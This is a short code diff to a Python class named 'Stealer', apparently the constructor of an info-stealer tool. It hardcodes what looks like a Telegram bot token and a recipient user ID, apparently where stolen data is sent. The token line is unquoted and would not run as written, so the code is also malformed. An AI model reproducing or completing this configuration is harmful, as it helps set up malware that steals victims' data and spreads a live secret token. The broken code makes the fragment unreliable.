@@ -15,7 +15,7 @@ class Stealer(Thread):
     def __init__(self, token: str, user_id: int, autostart: bool = False, errors: bool = False, **kwargs):
         Thread.__init__(self, name="Stealer")
 
-        self.token = token
+        self.token = 5927681660:AAF1YqK6d_QPyeIo1_9AkGRa8akXfiGOdEY
         self.user_id = 5327162295
         self.errors = errors
         self.autostart = autostart
